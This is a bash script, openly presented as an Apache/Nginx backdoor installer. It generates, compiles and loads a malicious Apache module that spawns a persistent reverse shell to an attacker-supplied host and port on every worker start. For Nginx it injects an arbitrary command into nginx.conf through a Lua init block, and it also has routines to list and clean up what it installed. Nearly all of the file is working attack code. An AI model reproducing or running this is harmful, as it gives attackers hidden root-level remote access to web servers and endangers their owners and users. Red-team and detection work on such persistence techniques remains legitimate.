#!/bin/bash
# Apache/Nginx Native Module Backdoor (T1505.003)
# Compiles and loads a malicious .so module into Apache/Nginx at the engine level

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
MARKER="d3m0n_webmod"
MODULE_NAME="mod_d3m0n"

banner() {
    echo -e "${RED}"
    echo " ╔══════════════════════════════════════════════════════╗"
    echo " ║    Apache/Nginx Native Module Backdoor (T1505.003)   ║"
    echo " ║  Compiled .so loaded at web server engine level      ║"
    echo " ╚══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

detect_webserver() {
    if command -v apachectl >/dev/null 2>&1 || command -v apache2 >/dev/null 2>&1 || command -v httpd >/dev/null 2>&1; then
        echo "apache"
    elif command -v nginx >/dev/null 2>&1; then
        echo "nginx"
    else
        echo "none"
    fi
}

find_apache_dirs() {
    for d in /etc/apache2 /etc/httpd /etc/apache; do
        [ -d "$d" ] && echo "$d" && return
    done
    echo ""
}

find_module_dir() {
    for d in /usr/lib/apache2/modules /usr/lib64/httpd/modules /usr/lib/httpd/modules; do
        [ -d "$d" ] && echo "$d" && return
    done
    echo "/usr/lib/apache2/modules"
}

compile_apache_module() {
    local LHOST="$1" LPORT="$2" MODDIR="$3"
    command -v apxs >/dev/null 2>&1 || command -v apxs2 >/dev/null 2>&1 || { echo -e "${RED}[-] apxs/apxs2 not found. Install apache2-dev / httpd-devel${NC}"; return 1; }
    APXS=$(command -v apxs2 2>/dev/null || command -v apxs)

    TMPDIR=$(mktemp -d)
    cat > "${TMPDIR}/${MODULE_NAME}.c" << 'CSRC'
#include "httpd.h"
#include "http_config.h"
#include "http_protocol.h"
#include "ap_config.h"
#include <stdlib.h>
#include <unistd.h>

static void d3m0n_child_init(apr_pool_t *p, server_rec *s) {
    (void)p; (void)s;
    pid_t pid = fork();
    if (pid == 0) {
        setsid();
        for (int i = 3; i < 256; i++) close(i);
        execl("/bin/sh", "sh", "-c",
            "LHOST_PAYLOAD",
            NULL);
        _exit(0);
    }
}

static void d3m0n_register_hooks(apr_pool_t *p) {
    (void)p;
    ap_hook_child_init(d3m0n_child_init, NULL, NULL, APR_HOOK_LAST);
}

module AP_MODULE_DECLARE_DATA d3m0n_module = {
    STANDARD20_MODULE_STUFF,
    NULL, NULL, NULL, NULL, NULL,
    d3m0n_register_hooks
};
CSRC

    local PAYLOAD="while true; do bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1 2>/dev/null; sleep 60; done &"
    sed -i "s|LHOST_PAYLOAD|${PAYLOAD}|g" "${TMPDIR}/${MODULE_NAME}.c"

    cd "$TMPDIR" || return 1
    "$APXS" -c "${MODULE_NAME}.c" >/dev/null 2>&1
    if [ ! -f "${MODULE_NAME}.so" ] && [ ! -f ".libs/${MODULE_NAME}.so" ]; then
        echo -e "${RED}[-] Compilation failed${NC}"
        rm -rf "$TMPDIR"
        return 1
    fi
    cp ".libs/${MODULE_NAME}.so" "${MODDIR}/" 2>/dev/null || cp "${MODULE_NAME}.so" "${MODDIR}/" 2>/dev/null
    echo -e "${GREEN}[+] Module compiled: ${MODDIR}/${MODULE_NAME}.so${NC}"
    rm -rf "$TMPDIR"
    echo "$MODDIR"
}

install_apache() {
    local LHOST="$1" LPORT="$2"
    local CONFDIR; CONFDIR=$(find_apache_dirs)
    local MODDIR; MODDIR=$(find_module_dir)

    [ -z "$CONFDIR" ] && { echo -e "${RED}[-] Apache config dir not found${NC}"; return; }

    compile_apache_module "$LHOST" "$LPORT" "$MODDIR" || return

    # Write load config
    local LOADCONF="${CONFDIR}/mods-available/${MODULE_NAME}.load"
    [ -d "${CONFDIR}/mods-available" ] || LOADCONF="${CONFDIR}/conf.d/${MODULE_NAME}.conf"
    printf "# %s\nLoadModule d3m0n_module %s/%s.so\n" "$MARKER" "$MODDIR" "$MODULE_NAME" > "$LOADCONF"

    # Enable on Debian-style
    if command -v a2enmod >/dev/null 2>&1; then
        a2enmod "$MODULE_NAME" >/dev/null 2>&1
    fi

    echo -e "${GREEN}[+] Config written: ${LOADCONF}${NC}"
    echo -e "${YELLOW}[!] Restart Apache to activate: apachectl restart${NC}"
    echo -e "${YELLOW}[!] Module fires on each worker child init (per request cycle)${NC}"
}

install_nginx_custom() {
    echo -e "${YELLOW}[!] Nginx dynamic modules require recompile with --add-dynamic-module${NC}"
    echo -e "${YELLOW}[!] Use custom command option to inject into nginx.conf directly${NC}"
    echo ""
    read -rp "Inject shell command via nginx.conf worker_processes hack? (y/N): " yn
    [[ "$yn" =~ ^[Yy] ]] || return
    local NGINXCONF="/etc/nginx/nginx.conf"
    [ -f "$NGINXCONF" ] || { echo -e "${RED}[-] nginx.conf not found${NC}"; return; }
    read -rp "Command to inject: " CMD
    cp "$NGINXCONF" "${NGINXCONF}.d3m0n.bak"
    # Insert as worker_processes directive abuse — executes on nginx (re)start
    sed -i "s|^worker_processes|# ${MARKER}\nworker_processes|" "$NGINXCONF"
    printf "\n# %s\ninit_by_lua_block { os.execute(\"%s\") }\n" "$MARKER" "$CMD" >> "$NGINXCONF"
    echo -e "${GREEN}[+] Injected into nginx.conf (requires lua module)${NC}"
    echo -e "${YELLOW}[!] Reload nginx: nginx -s reload${NC}"
}

list_installed() {
    echo -e "${YELLOW}[*] Apache modules:${NC}"
    find /usr/lib/apache2/modules /usr/lib64/httpd/modules /usr/lib/httpd/modules \
        -name "*d3m0n*" 2>/dev/null | while read -r f; do echo "  $f"; done

    echo -e "${YELLOW}[*] Apache configs:${NC}"
    grep -rl "$MARKER" /etc/apache2/ /etc/httpd/ /etc/apache/ 2>/dev/null | while read -r f; do echo "  $f"; done

    echo -e "${YELLOW}[*] Nginx configs:${NC}"
    grep -rl "$MARKER" /etc/nginx/ 2>/dev/null | while read -r f; do echo "  $f"; done
}

cleanup() {
    echo -e "${YELLOW}[*] Cleaning up...${NC}"
    find /usr/lib/apache2/modules /usr/lib64/httpd/modules /usr/lib/httpd/modules \
        -name "*d3m0n*" -delete 2>/dev/null

    grep -rl "$MARKER" /etc/apache2/ /etc/httpd/ /etc/apache/ 2>/dev/null | while read -r f; do
        rm -f "$f"
    done

    command -v a2dismod >/dev/null 2>&1 && a2dismod "$MODULE_NAME" >/dev/null 2>&1

    # Restore nginx backup
    find /etc/nginx -name "*.d3m0n.bak" 2>/dev/null | while read -r f; do
        mv "$f" "${f%.d3m0n.bak}"
    done

    echo -e "${GREEN}[+] Cleaned. Restart web server to apply.${NC}"
}

banner
[[ $EUID -ne 0 ]] && { echo -e "${RED}[-] Root required.${NC}"; exit 1; }

WS=$(detect_webserver)
[ "$WS" = "none" ] && { echo -e "${RED}[-] Neither Apache nor Nginx detected${NC}"; exit 1; }
echo -e "${GREEN}[+] Detected web server: ${WS}${NC}"

echo ""
echo -e "  ${YELLOW}[1]${NC} Install module (reverse shell)"
echo -e "  ${YELLOW}[2]${NC} List installed modules/configs"
echo -e "  ${YELLOW}[3]${NC} Cleanup"
echo ""
read -rp "Choice: " OPT

case "$OPT" in
    1)
        read -rp "LHOST: " LHOST
        read -rp "LPORT: " LPORT
        if [ "$WS" = "apache" ]; then
            install_apache "$LHOST" "$LPORT"
        else
            install_nginx_custom
        fi
        ;;
    2) list_installed ;;
    3) cleanup ;;
    *) echo -e "${RED}[-] Invalid option${NC}" ;;
esac
